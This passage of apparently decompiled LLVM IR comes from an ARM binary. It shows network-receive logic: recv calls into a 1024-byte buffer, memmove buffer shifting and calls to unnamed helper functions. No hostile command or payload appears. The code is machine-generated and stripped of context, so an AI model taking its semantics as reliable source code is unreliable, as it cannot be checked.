  %v4_a0c4 = load i8, i8* %v3_a0c4, align 1
  %v6_a0c4 = zext i8 %v4_a0c4 to i32
  store i32 %v6_a0c4, i32* %r3.global-to-local, align 4
  %v2_a0c8 = icmp ugt i8 %v4_a0c4, 46
  store i1 %v2_a0c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a0c8 = icmp ult i8 %v4_a0c4, 47
  store i1 %v6_a0c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a0c8 = icmp eq i8 %v4_a0c4, 47
  store i1 %v7_a0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0c8, label %dec_label_pc_a824, label %dec_label_pc_a0d0

dec_label_pc_a0d0:                                ; preds = %dec_label_pc_a17c, %dec_label_pc_a768, %dec_label_pc_a854, %dec_label_pc_a824, %dec_label_pc_a700, %dec_label_pc_a6e4, %dec_label_pc_a0c0, %dec_label_pc_a870, %dec_label_pc_a730
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_a0d4 = load i32, i32* @r8, align 4
  %v3_a0d4 = add i32 %v2_a0d4, -1452
  %v4_a0d4 = inttoptr i32 %v3_a0d4 to i8*
  store i8 1, i8* %v4_a0d4, align 1
  br label %dec_label_pc_9508

dec_label_pc_a0dc:                                ; preds = %dec_label_pc_94f8
  %v0_a0dc = call i32* @__errno_location()
  %v1_a0dc = ptrtoint i32* %v0_a0dc to i32
  store i32 %v1_a0dc, i32* %r0.global-to-local, align 4
  %v0_a0e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_a0e0 = add i32 %v0_a0e0, 1472
  store i32 %v1_a0e0, i32* %r3.global-to-local, align 4
  %v0_a0e8 = load i32, i32* @r8, align 4
  %v1_a0e8 = add i32 %v0_a0e8, 656
  %v2_a0e8 = inttoptr i32 %v1_a0e8 to i32*
  %v3_a0e8 = load i32, i32* %v2_a0e8, align 4
  store i32 %v3_a0e8, i32* %r3.global-to-local, align 4
  %v1_a0f0 = add i32 %v3_a0e8, -1024
  %v2_a0f0 = icmp ugt i32 %v3_a0e8, 1023
  store i1 %v2_a0f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a0f0 = sub i32 1023, %v3_a0e8
  %v4_a0f0 = and i32 %v3_a0f0, %v3_a0e8
  %v5_a0f0 = icmp slt i32 %v4_a0f0, 0
  store i1 %v5_a0f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a0f0 = icmp slt i32 %v1_a0f0, 0
  store i1 %v6_a0f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a0f0 = icmp eq i32 %v3_a0e8, 1024
  store i1 %v7_a0f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a0dc, i32* %fp.global-to-local, align 4
  %v1_a0f8 = add i32 %v0_a0e0, 2116
  store i32 %v1_a0f8, i32* @r7, align 4
  br i1 %v7_a0f0, label %dec_label_pc_a1f8, label %dec_label_pc_a100

dec_label_pc_a100:                                ; preds = %dec_label_pc_a0dc, %dec_label_pc_a1f8, %dec_label_pc_a1ec
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a104 = load i32, i32* %fp.global-to-local, align 4
  %v2_a104 = inttoptr i32 %v1_a104 to i32*
  store i32 0, i32* %v2_a104, align 4
  %v0_a108 = load i32, i32* @r8, align 4
  %v1_a108 = add i32 %v0_a108, 656
  %v2_a108 = inttoptr i32 %v1_a108 to i32*
  %v3_a108 = load i32, i32* %v2_a108, align 4
  store i32 %v3_a108, i32* %r1.global-to-local, align 4
  %v1_a10c = add i32 %v0_a108, -1456
  %v2_a10c = inttoptr i32 %v1_a10c to i32*
  %v3_a10c = load i32, i32* %v2_a10c, align 4
  store i32 %v3_a10c, i32* %r0.global-to-local, align 4
  %v1_a110 = sub i32 1024, %v3_a108
  store i32 %v1_a110, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a118 = load i32, i32* @r7, align 4
  %v2_a118 = add i32 %v0_a118, %v3_a108
  store i32 %v2_a118, i32* %r1.global-to-local, align 4
  %v4_a11c = inttoptr i32 %v2_a118 to i32*
  %v5_a11c = call i32 @recv(i32 %v3_a10c, i32* %v4_a11c, i32 %v1_a110, i32 16384)
  store i32 %v5_a11c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a120 = icmp slt i32 %v5_a11c, 0
  store i1 %v1_a120, i1* %cpsr_n.global-to-local, align 1
  %v2_a120 = icmp eq i32 %v5_a11c, 0
  store i1 %v2_a120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a120, label %dec_label_pc_a5fc, label %dec_label_pc_a128

dec_label_pc_a128:                                ; preds = %dec_label_pc_a100
  %v1_a128 = add i32 %v5_a11c, 1
  %v2_a128 = icmp eq i32 %v5_a11c, -1
  store i1 %v2_a128, i1* %cpsr_c.global-to-local, align 1
  %v3_a128 = sub i32 0, %v5_a11c
  %v4_a128 = and i32 %v1_a128, %v3_a128
  %v5_a128 = icmp slt i32 %v4_a128, 0
  store i1 %v5_a128, i1* %cpsr_v.global-to-local, align 1
  %v6_a128 = icmp slt i32 %v1_a128, 0
  store i1 %v6_a128, i1* %cpsr_n.global-to-local, align 1
  %v7_a128 = icmp eq i32 %v1_a128, 0
  store i1 %v7_a128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a128, label %dec_label_pc_a620, label %dec_label_pc_a130

dec_label_pc_a130:                                ; preds = %dec_label_pc_a128
  %v0_a130 = load i32, i32* @r8, align 4
  %v1_a130 = add i32 %v0_a130, 656
  %v2_a130 = inttoptr i32 %v1_a130 to i32*
  %v3_a130 = load i32, i32* %v2_a130, align 4
  store i32 %v2_94a8, i32* %r1.global-to-local, align 4
  %v2_a138 = add i32 %v3_a130, %v5_a11c
  store i32 %v2_a138, i32* @r4, align 4
  store i32 %v2_a138, i32* %v2_a130, align 4
  %v0_a140 = load i32, i32* %r1.global-to-local, align 4
  %v1_a140 = load i32, i32* @r8, align 4
  %v2_a140 = add i32 %v1_a140, -1448
  %v3_a140 = inttoptr i32 %v2_a140 to i32*
  store i32 %v0_a140, i32* %v3_a140, align 4
  br label %dec_label_pc_a1cc

dec_label_pc_a148:                                ; preds = %dec_label_pc_a1cc
  %v1_a148 = add i32 %v0_a1cc, -4
  %v2_a148 = inttoptr i32 %v1_a148 to i32*
  %v3_a148 = load i32, i32* %v2_a148, align 4
  store i32 %v3_a148, i32* @sl, align 4
  %v1_a14c = load i32, i32* @r4, align 4
  %v5_a150 = icmp slt i32 %v3_a1cc, %v1_a14c
  %storemerge74 = select i1 %v5_a150, i32 %v3_a1cc, i32 %v1_a14c
  store i32 %storemerge74, i32* @r5, align 4
  %v2_a158 = sub i32 %v3_a1cc, %storemerge74
  store i32 %v2_a158, i32* @r6, align 4
  %v1_a15c = add i32 %v3_a148, -1
  %v2_a15c = icmp ne i32 %v3_a148, 0
  store i1 %v2_a15c, i1* %cpsr_c.global-to-local, align 1
  %v3_a15c = sub i32 0, %v3_a148
  %v4_a15c = and i32 %v3_a148, %v3_a15c
  %v5_a15c = icmp slt i32 %v4_a15c, 0
  store i1 %v5_a15c, i1* %cpsr_v.global-to-local, align 1
  %v6_a15c = icmp slt i32 %v1_a15c, 0
  store i1 %v6_a15c, i1* %cpsr_n.global-to-local, align 1
  %v7_a15c = icmp eq i32 %v3_a148, 1
  store i1 %v7_a15c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a158, i32* %v2_a1cc, align 4
  br i1 %v7_a15c, label %dec_label_pc_a218, label %dec_label_pc_a148.dec_label_pc_a168thread-pre-split_crit_edge

dec_label_pc_a148.dec_label_pc_a168thread-pre-split_crit_edge: ; preds = %dec_label_pc_a148
  %v0_a168.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %dec_label_pc_a1d8, %dec_label_pc_a148.dec_label_pc_a168thread-pre-split_crit_edge, %dec_label_pc_a240
  %v0_a168 = phi i32 [ %v3_a240, %dec_label_pc_a240 ], [ %v0_a168.pr.pre, %dec_label_pc_a148.dec_label_pc_a168thread-pre-split_crit_edge ], [ %v3_a1cc, %dec_label_pc_a1d8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a168 = icmp slt i32 %v0_a168, 0
  store i1 %v1_a168, i1* %cpsr_n.global-to-local, align 1
  %v2_a168 = icmp eq i32 %v0_a168, 0
  store i1 %v2_a168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a168, label %dec_label_pc_a170, label %dec_label_pc_a190

dec_label_pc_a170:                                ; preds = %dec_label_pc_a168
  %v0_a170 = load i32, i32* @r8, align 4
  %v1_a170 = add i32 %v0_a170, 4
  %v2_a170 = inttoptr i32 %v1_a170 to i32*
  %v3_a170 = load i32, i32* %v2_a170, align 4
  store i32 %v3_a170, i32* @r4, align 4
  %v1_a174 = add i32 %v3_a170, -1
  %v2_a174 = icmp ne i32 %v3_a170, 0
  store i1 %v2_a174, i1* %cpsr_c.global-to-local, align 1
  %v3_a174 = sub i32 0, %v3_a170
  %v4_a174 = and i32 %v3_a170, %v3_a174
  %v5_a174 = icmp slt i32 %v4_a174, 0
  store i1 %v5_a174, i1* %cpsr_v.global-to-local, align 1
  %v6_a174 = icmp slt i32 %v1_a174, 0
  store i1 %v6_a174, i1* %cpsr_n.global-to-local, align 1
  %v7_a174 = icmp eq i32 %v3_a170, 1
  store i1 %v7_a174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a174, label %dec_label_pc_a248, label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_a170
  %v1_a17c = add i32 %v0_a170, 656
  %v2_a17c = inttoptr i32 %v1_a17c to i32*
  %v3_a17c = load i32, i32* %v2_a17c, align 4
  %v0_a180 = load i32, i32* @r5, align 4
  %v2_a180 = sub i32 %v3_a17c, %v0_a180
  store i32 %v2_a180, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a184 = icmp slt i32 %v2_a180, 0
  store i1 %v1_a184, i1* %cpsr_n.global-to-local, align 1
  %v2_a184 = icmp eq i32 %v2_a180, 0
  store i1 %v2_a184, i1* %cpsr_z.global-to-local, align 1
  %v2_a188 = add i32 %v0_a170, 8
  %v3_a188 = inttoptr i32 %v2_a188 to i32*
  store i32 %v2_a180, i32* %v3_a188, align 4
  br i1 %v2_a184, label %dec_label_pc_a0d0, label %dec_label_pc_a190

dec_label_pc_a190:                                ; preds = %dec_label_pc_a168, %dec_label_pc_a248, %dec_label_pc_a17c, %dec_label_pc_a2d0
  %v0_a190 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a190 = icmp slt i32 %v0_a190, 0
  store i1 %v1_a190, i1* %cpsr_n.global-to-local, align 1
  %v2_a190 = icmp eq i32 %v0_a190, 0
  store i1 %v2_a190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a190, label %dec_label_pc_a1e0, label %dec_label_pc_a198

dec_label_pc_a198:                                ; preds = %dec_label_pc_a190
  %v0_a198 = load i32, i32* @r8, align 4
  %v1_a198 = add i32 %v0_a198, 656
  %v2_a198 = inttoptr i32 %v1_a198 to i32*
  %v3_a198 = load i32, i32* %v2_a198, align 4
  store i32 %v3_a198, i32* %r3.global-to-local, align 4
  %v2_a19c = sub i32 %v3_a198, %v0_a190
  store i32 %v2_a19c, i32* %r4.global-to-local, align 4
  store i32 %v2_a19c, i32* %r2.global-to-local, align 4
  store i32 %v2_a19c, i32* %v2_a198, align 4
  %v0_a1a8 = load i32, i32* @r7, align 4
  %v1_a1a8 = load i32, i32* @r5, align 4
  %v2_a1a8 = add i32 %v1_a1a8, %v0_a1a8
  store i32 %v2_a1a8, i32* %r1.global-to-local, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v3_a1b0 = inttoptr i32 %v0_a1a8 to i32*
  %v4_a1b0 = inttoptr i32 %v2_a1a8 to i32*
  %v5_a1b0 = call i32* @memmove(i32* %v3_a1b0, i32* %v4_a1b0, i32 %v2_a19c)
  %v7_a1b0 = ptrtoint i32* %v5_a1b0 to i32
  store i32 %v7_a1b0, i32* %r0.global-to-local, align 4
  %v0_a1b4 = load i32, i32* @r8, align 4
  %v1_a1b4 = add i32 %v0_a1b4, 656
  %v2_a1b4 = inttoptr i32 %v1_a1b4 to i32*
  %v3_a1b4 = load i32, i32* %v2_a1b4, align 4
  store i32 %v3_a1b4, i32* @r4, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a1bc = load i32, i32* %sb.global-to-local, align 4
  %v2_a1bc = add i32 %v1_a1bc, %v3_a1b4
  store i32 %v2_a1bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1c0 = icmp slt i32 %v3_a1b4, 0
  store i1 %v1_a1c0, i1* %cpsr_n.global-to-local, align 1
  %v2_a1c0 = icmp eq i32 %v3_a1b4, 0
  store i1 %v2_a1c0, i1* %cpsr_z.global-to-local, align 1
  %v3_a1c4 = add i32 %v2_a1bc, 2116
  %v4_a1c4 = inttoptr i32 %v3_a1c4 to i8*
  store i8 0, i8* %v4_a1c4, align 1
  %v0_a1c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1c8, label %dec_label_pc_a1e0, label %dec_label_pc_a1cc

dec_label_pc_a1cc:                                ; preds = %dec_label_pc_a198, %dec_label_pc_a130
  %v0_a1cc = load i32, i32* @r8, align 4
  %v1_a1cc = add i32 %v0_a1cc, 8
  %v2_a1cc = inttoptr i32 %v1_a1cc to i32*
  %v3_a1cc = load i32, i32* %v2_a1cc, align 4
  store i32 %v3_a1cc, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1d0 = icmp slt i32 %v3_a1cc, 0
  store i1 %v1_a1d0, i1* %cpsr_n.global-to-local, align 1
  %v2_a1d0 = icmp eq i32 %v3_a1cc, 0
  store i1 %v2_a1d0, i1* %cpsr_z.global-to-local, align 1
  %v5_a1d4 = icmp sgt i32 %v3_a1cc, 0
  br i1 %v5_a1d4, label %dec_label_pc_a148, label %dec_label_pc_a1d8

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a1cc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_a168

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a198, %dec_label_pc_a190
  %v0_a1e0 = load i32, i32* @r8, align 4
  %v1_a1e0 = add i32 %v0_a1e0, -1452
  %v2_a1e0 = inttoptr i32 %v1_a1e0 to i8*
  %v3_a1e0 = load i8, i8* %v2_a1e0, align 1
  %v4_a1e0 = zext i8 %v3_a1e0 to i32
  store i32 %v4_a1e0, i32* %r3.global-to-local, align 4
  %v2_a1e4 = icmp ugt i8 %v3_a1e0, 6
  store i1 %v2_a1e4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a1e4 = icmp ult i8 %v3_a1e0, 7
  store i1 %v6_a1e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a1e4 = icmp eq i8 %v3_a1e0, 7
  store i1 %v7_a1e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1e4, label %dec_label_pc_a1ec, label %dec_label_pc_9508

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a1e0
  %v1_a1ec = add i32 %v0_a1e0, 656
  %v2_a1ec = inttoptr i32 %v1_a1ec to i32*
  %v3_a1ec = load i32, i32* %v2_a1ec, align 4
  store i32 %v3_a1ec, i32* %r3.global-to-local, align 4
  %v1_a1f0 = add i32 %v3_a1ec, -1024
  %v2_a1f0 = icmp ugt i32 %v3_a1ec, 1023
  store i1 %v2_a1f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a1f0 = sub i32 1023, %v3_a1ec
  %v4_a1f0 = and i32 %v3_a1f0, %v3_a1ec
  %v5_a1f0 = icmp slt i32 %v4_a1f0, 0
  store i1 %v5_a1f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a1f0 = icmp slt i32 %v1_a1f0, 0
  store i1 %v6_a1f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a1f0 = icmp eq i32 %v3_a1ec, 1024
  store i1 %v7_a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1f0, label %dec_label_pc_a1f8.loopexit, label %dec_label_pc_a100

dec_label_pc_a1f8.loopexit:                       ; preds = %dec_label_pc_a1ec
  %v0_a1f8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a1f8

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1f8.loopexit, %dec_label_pc_a0dc
  %v0_a1f8 = phi i32 [ %v0_a1f8.pre, %dec_label_pc_a1f8.loopexit ], [ %v1_a0f8, %dec_label_pc_a0dc ]
  store i32 %v0_a1f8, i32* %r0.global-to-local, align 4
  %v1_a1fc = add i32 %v0_a1f8, 64
  store i32 %v1_a1fc, i32* %r1.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_a204 = inttoptr i32 %v0_a1f8 to i32*
  %v4_a204 = inttoptr i32 %v1_a1fc to i32*
  %v5_a204 = call i32* @memmove(i32* %v3_a204, i32* %v4_a204, i32 960)
  %v7_a204 = ptrtoint i32* %v5_a204 to i32
  store i32 %v7_a204, i32* %r0.global-to-local, align 4
  %v0_a208 = load i32, i32* @r8, align 4
  %v1_a208 = add i32 %v0_a208, 656
  %v2_a208 = inttoptr i32 %v1_a208 to i32*
  %v3_a208 = load i32, i32* %v2_a208, align 4
  store i32 %v3_a208, i32* %r3.global-to-local, align 4
  %v1_a20c = add i32 %v3_a208, -64
  store i32 %v1_a20c, i32* @r4, align 4
  store i32 %v1_a20c, i32* %v2_a208, align 4
  br label %dec_label_pc_a100

dec_label_pc_a218:                                ; preds = %dec_label_pc_a148
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v3_a220 = call i32 @function_1219c(i32 43, i32* null)
  %v0_a224 = load i32, i32* @r4, align 4
  store i32 %v0_a224, i32* %r1.global-to-local, align 4
  store i32 %v3_a220, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a230 = load i32, i32* @r7, align 4
  store i32 %v0_a230, i32* %r0.global-to-local, align 4
  %v4_a234 = call i32 @function_12df8(i32 %v0_a230, i32 %v0_a224, i32 %v3_a220, i32 11)
  store i32 %v4_a234, i32* %r0.global-to-local, align 4
  %v2_a238 = add i32 %v4_a234, 1
  %v3_a238 = icmp eq i32 %v4_a234, -1
  store i1 %v3_a238, i1* %cpsr_c.global-to-local, align 1
  %v4_a238 = sub i32 0, %v4_a234
  %v5_a238 = and i32 %v2_a238, %v4_a238
  %v6_a238 = icmp slt i32 %v5_a238, 0
  store i1 %v6_a238, i1* %cpsr_v.global-to-local, align 1
  %v7_a238 = icmp slt i32 %v2_a238, 0
  store i1 %v7_a238, i1* %cpsr_n.global-to-local, align 1
  %v8_a238 = icmp eq i32 %v2_a238, 0
  store i1 %v8_a238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a238, label %dec_label_pc_a240, label %dec_label_pc_a7a4

dec_label_pc_a240:                                ; preds = %dec_label_pc_a218
  %v0_a240 = load i32, i32* @r8, align 4
  %v1_a240 = add i32 %v0_a240, 8
  %v2_a240 = inttoptr i32 %v1_a240 to i32*
  %v3_a240 = load i32, i32* %v2_a240, align 4
  store i32 %v3_a240, i32* @r6, align 4
  br label %dec_label_pc_a168

dec_label_pc_a248:                                ; preds = %dec_label_pc_a170
  %v0_a248 = load i32, i32* @r7, align 4
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v1_a24c = add i32 %v0_a170, 656
  %v2_a24c = inttoptr i32 %v1_a24c to i32*
  %v3_a24c = load i32, i32* %v2_a24c, align 4
  store i32 %v3_a24c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_a258 = call i32 @function_12df8(i32 %v0_a248, i32 %v3_a24c, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_a258, i32* %r0.global-to-local, align 4
  %v1_a25c = add i32 %v4_a258, 1
  %v2_a25c = icmp eq i32 %v4_a258, -1
  store i1 %v2_a25c, i1* %cpsr_c.global-to-local, align 1
  %v3_a25c = sub i32 0, %v4_a258
  %v4_a25c = and i32 %v1_a25c, %v3_a25c
  %v5_a25c = icmp slt i32 %v4_a25c, 0
  store i1 %v5_a25c, i1* %cpsr_v.global-to-local, align 1
  %v6_a25c = icmp slt i32 %v1_a25c, 0
  store i1 %v6_a25c, i1* %cpsr_n.global-to-local, align 1
  %v7_a25c = icmp eq i32 %v1_a25c, 0
  store i1 %v7_a25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a25c, label %dec_label_pc_a190, label %dec_label_pc_a264

dec_label_pc_a264:                                ; preds = %dec_label_pc_a248
  %v0_a264 = load i32, i32* @r8, align 4
  %v1_a264 = add i32 %v0_a264, 656
  %v2_a264 = inttoptr i32 %v1_a264 to i32*
  %v3_a264 = load i32, i32* %v2_a264, align 4
  store i32 %v3_a264, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_a270 = load i32, i32* @r7, align 4
  store i32 %v0_a270, i32* %r0.global-to-local, align 4
  %v4_a274 = call i32 @function_12df8(i32 %v0_a270, i32 %v3_a264, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  %v1_a278 = load i32, i32* %sb.global-to-local, align 4
  %v2_a278 = add i32 %v1_a278, %v4_a274
  store i32 %v2_a278, i32* %ip.global-to-local, align 4
  store i32 %v4_a274, i32* @r5, align 4
  store i32 %v4_a274, i32* %r1.global-to-local, align 4
  %v0_a284 = load i32, i32* @r7, align 4
  store i32 %v0_a284, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32* %r2.global-to-local, align 4
  %v0_a28c = load i32, i32* @r4, align 4
  store i32 %v0_a28c, i32* %r3.global-to-local, align 4
  %v0_a290 = load i32, i32* @r6, align 4
  %v1_a290 = trunc i32 %v0_a290 to i8
  %v3_a290 = add i32 %v2_a278, 2114
  %v4_a290 = inttoptr i32 %v3_a290 to i8*
  store i8 %v1_a290, i8* %v4_a290, align 1
  %v4_a294 = call i32 @function_12df8(i32 %v0_a284, i32 %v4_a274, i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32 %v0_a28c)
  store i32 %v4_a294, i32* %r0.global-to-local, align 4
  %v1_a298 = add i32 %v4_a294, 1
  %v2_a298 = icmp eq i32 %v4_a294, -1
  store i1 %v2_a298, i1* %cpsr_c.global-to-local, align 1
  %v3_a298 = sub i32 0, %v4_a294
  %v4_a298 = and i32 %v1_a298, %v3_a298
  %v5_a298 = icmp slt i32 %v4_a298, 0
  store i1 %v5_a298, i1* %cpsr_v.global-to-local, align 1
  %v6_a298 = icmp slt i32 %v1_a298, 0
  store i1 %v6_a298, i1* %cpsr_n.global-to-local, align 1
  %v7_a298 = icmp eq i32 %v1_a298, 0
  store i1 %v7_a298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a298, label %dec_label_pc_a2bc, label %dec_label_pc_a2a0

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a264
  %v0_a2a0 = load i32, i32* @r7, align 4
  store i32 %v0_a2a0, i32* %r0.global-to-local, align 4
  %v0_a2a4 = load i32, i32* @r5, align 4
  store i32 %v0_a2a4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32* %r2.global-to-local, align 4
  %v0_a2ac = load i32, i32* @r4, align 4
  store i32 %v0_a2ac, i32* %r3.global-to-local, align 4
  %v4_a2b0 = call i32 @function_12df8(i32 %v0_a2a0, i32 %v0_a2a4, i32 ptrtoint (i32* @global_var_136b4.94 to i32), i32 %v0_a2ac)
  %v1_a2b4 = load i32, i32* %sb.global-to-local, align 4
  %v2_a2b4 = add i32 %v1_a2b4, %v4_a2b0
  store i32 %v2_a2b4, i32* %r0.global-to-local, align 4
  %v0_a2b8 = load i32, i32* @r6, align 4
  %v1_a2b8 = trunc i32 %v0_a2b8 to i8
  %v3_a2b8 = add i32 %v2_a2b4, 2116
  %v4_a2b8 = inttoptr i32 %v3_a2b8 to i8*
  store i8 %v1_a2b8, i8* %v4_a2b8, align 1
  br label %dec_label_pc_a2bc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a264, %dec_label_pc_a2a0
  %v0_a2bc = load i32, i32* @r7, align 4
  store i32 %v0_a2bc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_a2c4 = inttoptr i32 %v0_a2bc to i8*
  %v3_a2c4 = call i32 @function_12e60(i8* %v2_a2c4, i32 16)
  store i32 %v3_a2c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a2c8 = icmp slt i32 %v3_a2c4, 0
  store i1 %v1_a2c8, i1* %cpsr_n.global-to-local, align 1
  %v2_a2c8 = icmp eq i32 %v3_a2c4, 0
  store i1 %v2_a2c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2c8, label %dec_label_pc_aa54, label %dec_label_pc_a2d0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a2bc
  %v1_a2d0 = add i32 %v3_a2c4, 2
  store i32 %v1_a2d0, i32* %r6.global-to-local, align 4
  %v1_a2d4 = load i32, i32* @r8, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 8
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v1_a2d0, i32* %v3_a2d4, align 4
  br label %dec_label_pc_a190

dec_label_pc_a2dc:                                ; preds = %dec_label_pc_9984
  %v0_a2dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a2dc, i32* %r1.global-to-local, align 4
  %v0_a2e0 = load i32, i32* @r6, align 4
  store i32 %v0_a2e0, i32* @r0, align 4
  %v2_a2e4 = inttoptr i32 %v0_a2e0 to i8*
  %v3_a2e4 = call i32 @function_12d5c(i8* %v2_a2e4, i32 %v0_a2dc)
  store i32 %v3_a2e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_999c

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_9500
  %v0_a2ec = call i32* @__errno_location()
  %v2_a2ec = ptrtoint i32* %v0_a2ec to i32
  store i32 %v2_a2ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_a2ec, i32* @r4, align 4
  br label %dec_label_pc_a2f8

dec_label_pc_a2f8:                                ; preds = %dec_label_pc_a318.dec_label_pc_a2f8_crit_edge, %dec_label_pc_a2ec
  %v1_a2f8 = phi i32 [ %v1_a2f8.pre, %dec_label_pc_a318.dec_label_pc_a2f8_crit_edge ], [ %v2_a2ec, %dec_label_pc_a2ec ]
  %v0_a2f8 = phi i32 [ %v0_a2f8.pre, %dec_label_pc_a318.dec_label_pc_a2f8_crit_edge ], [ 0, %dec_label_pc_a2ec ]
  %v2_a2f8 = inttoptr i32 %v1_a2f8 to i32*
  store i32 %v0_a2f8, i32* %v2_a2f8, align 4
  store i32 %v2_8f50, i32* %r1.global-to-local, align 4
  %v0_a300 = load i32, i32* @r8, align 4
  %v1_a300 = add i32 %v0_a300, -1456
  %v2_a300 = inttoptr i32 %v1_a300 to i32*
  %v3_a300 = load i32, i32* %v2_a300, align 4
  store i32 %v3_a300, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_a30c = call i32 @recv(i32 %v3_a300, i32* nonnull %stack_var_-20809, i32 10240, i32 16384)
  store i32 %v5_a30c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a310 = icmp slt i32 %v5_a30c, 0
  store i1 %v1_a310, i1* %cpsr_n.global-to-local, align 1
  %v2_a310 = icmp eq i32 %v5_a30c, 0
  store i1 %v2_a310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a310, label %dec_label_pc_a5f0, label %dec_label_pc_a318

dec_label_pc_a318:                                ; preds = %dec_label_pc_a2f8
  %v2_a318 = add i32 %v5_a30c, 1
  %v3_a318 = icmp eq i32 %v5_a30c, -1
  store i1 %v3_a318, i1* %cpsr_c.global-to-local, align 1
  %v4_a318 = sub i32 0, %v5_a30c
  %v5_a318 = and i32 %v2_a318, %v4_a318
  %v6_a318 = icmp slt i32 %v5_a318, 0
  store i1 %v6_a318, i1* %cpsr_v.global-to-local, align 1
  %v7_a318 = icmp slt i32 %v2_a318, 0
  store i1 %v7_a318, i1* %cpsr_n.global-to-local, align 1
  %v8_a318 = icmp eq i32 %v2_a318, 0
  store i1 %v8_a318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a318, label %dec_label_pc_a320, label %dec_label_pc_a318.dec_label_pc_a2f8_crit_edge

